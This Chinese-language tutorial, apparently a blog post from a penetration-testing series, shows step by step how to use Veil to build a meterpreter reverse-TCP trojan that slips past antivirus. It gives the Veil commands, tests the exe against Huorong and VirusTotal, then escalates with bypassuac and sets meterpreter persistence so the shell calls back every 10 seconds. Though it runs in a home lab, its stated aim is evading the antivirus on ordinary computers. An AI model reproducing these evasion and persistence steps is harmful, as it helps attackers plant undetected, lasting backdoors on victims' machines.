**01**

  

        大家好，我是AAS。由于昨天说到的横向渗透是利用木马拿到权限，但是直接利用msf制作的木马一般都会被杀软直接杀掉，现在的电脑基本都装了杀软，所以很容易被识破，今天我们利用一款神器来过杀软。

          

**02**

  

**前期准备**  

        VMware虚拟机

        系统: 

        Kali2020.1 (攻击机)    192.168.232.132

        Windows 7 (靶机1)     192.168.232.138

        工具：veil

  

**03**

  

**制作木马**

  1.下载好veil工具后，在目录打开

   sudo ./Veil.py （打开工具）  

![](../Images/fb54fc10ae5a9b784615af171d2f35f3.png)

  

        2.选择第一个模块

     use 1  

![](../Images/c1c82175c8ae56cf9b1af48d499eb7cb.png)

  

        3.打开payload列表  

    list      有41个可用模块

![](../Images/ded9c11f1d3a3ab857e0f0a7d25e7643.png)![](../Images/e3260d343f326c0130b32da544ba255e.png)

  

        4.我们选择cs/meterpreter/rev\_tcp模块，是第十一个      use 11

![](../Images/3a03b0e7cab2db4e14813341d7c27f42.png)

  

        5.设置一下回弹ip   LHOST  (填本机ip) 

 set LHOST 192.168.232.132 我的kali内网ip是这个  

    下次利用内网穿透去设置不限于内网的木马；

![](../Images/c17ba36093923a8180a80ae4dce104d4.png)

  

        6.然后设置好了可以 options 查看一下选项 （和msf差不多命令）

        然后generate 运行，设置一个名字，这里我随便输入qwe

![](../Images/da2067d5c3e9c575ce9f1c2cd78f4cf8.png)

然后选择制作模式，1的免杀效果稍微好点。

![](../Images/6a24c5d19c3d9dc7eb9fc792eb0a276d.png)

        生成了一个exe文件。  

![](../Images/218c27ccb3bf7a7ea1260b1fb154829c.png)

  

        7.在指定目录下找到这个文件，并放到我物理机上，因为我的物理机装了火绒，我就用火绒测试一下

![](../Images/b5b93568160927d0d4856577b9cf5602.png)

        用火绒指定检测一下，  （火绒打钱）滑稽  

![](../Images/be2c994e3587bf172193cc1c32f9c034.png)

        好的，火绒静态下没有检测出来。  

![](../Images/7c266f0520274c9ff37e83f83723e911.png)

        我们对比一下，用没有免杀的木马试试  

![](../Images/1644771103d2940da07bb86db66ed34e.png)

        直接挂掉  

![](../Images/f986ef78343c4d9e7c604641e287ae6c.png)

  

        接下我再用virustotal后门检测工具检测一下，看看能被检测出多少后门程序 。

（网址：https://www.virustotal.com/gui/home/upload）

![](../Images/af77498ddf0962501fb6cd2d216b73f4.png)

        好吧，39个后门特征还是有点多的，还可以继续优化一下，但也过了最新版本的杀软，看看没有免杀的。

![](../Images/87ae1e03c1ccae7543cbe7c310105e8b.png)

        没有免杀的木马被检测出来是57个后门特征

**05**

  

 1.接下来就是提升成持续后门了。因为正常的话对方主机已关机我们的shell就不可用了，所以我们要设置成持续后们。  

            还是先bypassuac提权

![](../Images/77da8023df779990d71478c4c313b426.png)![](../Images/43a52cb19be9d04ec11fe7b13ad1f37d.png)

  

 完美提权  

![](../Images/2a8424876bf6cbee663f1c635de043aa.png)

  

        2.使用 run persistence 打开这个模块  

       -h 是帮助命令，查看有什么功能，大家自行去翻译

![](../Images/75fc75b2a39209cfbe18b0bb52413f18.png)

  

        3.接下来用以下命令进行配置。

![](../Images/1455d405b7834eb63ecb13c7822c8181.png)

        -A     是自动选择默认监听模块  

        -X     是系统启动时自动启动代理  

        -U     是用户登录时自动启动代理

        -i       是多少秒回弹一次shell  

        -p      是本机监听回弹的端口号  

        -r      是本机监听回弹的ip

            

  

        4.然后我们退出shell 用sessions -k 4 删除sessioons

![](../Images/77da8023df779990d71478c4c313b426.png)

        10秒就会回弹一次，就不怕对方关机，而shell下回不可用了。

![](../Images/43a52cb19be9d04ec11fe7b13ad1f37d.png)
